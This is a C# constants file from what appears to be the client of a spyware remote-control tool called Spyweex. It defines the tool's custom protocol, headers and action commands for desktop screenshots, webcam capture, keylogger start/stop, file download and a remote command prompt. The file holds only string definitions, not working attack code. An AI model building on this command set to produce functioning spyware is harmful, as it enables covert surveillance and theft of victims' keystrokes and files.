namespace spyweex_client_wpf
{
    namespace StaticStrings
    {
        public static class METHOD_TYPE
        {
            public static readonly string GET = "GET";
            public static readonly string POST = "POST";
        }

        public static class ACTION_TYPE
        {
            public static readonly string TAKE_DESKTOP_SCREEN = "/ACTION=TAKE_DESKTOP_SCREEN";
            public static readonly string TAKE_WEBCAM_SCREEN = "/ACTION=TAKE_WEBCAM_SCREEN";
            public static readonly string KEYLOGGER_START = "/ACTION=KEYLOGGER_START";
            public static readonly string KEYLOGGER_STOP = "/ACTION=KEYLOGGER_STOP";
            public static readonly string DOWNLOAD_FILE = "/ACTION=DOWNLOAD_FILE";
            public static readonly string COMMAND_PROMPT = "/ACTION=COMMAND_PROMPT";
        }

        public static class HEADER_TYPES
        {
            public static readonly string HOST = "Host:";
            public static readonly string TAG = "Tag:";
            public static readonly string USER_AGENT = "User-Agent:";
            public static readonly string CONTENT_TYPE = "Content-type:";
            public static readonly string CONTENT_LENGTH = "Content-Length:";

        }

        public static class DELIMITERS
        {
            public static readonly string DOUBLE_NEWLINE = "\r\n\r\n";
            public static readonly string NEWLINE = "\r\n";
            public static readonly char SPACE = ' ';
        }

        public static class VERSION
        {
            public static readonly string SPY_VERSION = "WXHTP/1.1";
            public static readonly string STANDARD_AGENT = "Spyweex-client-sharp";
        }

        public static class PARAM_TYPES
        {
            public static readonly string number = "--number=";
            public static readonly string path = "--path=";
        }

    }
}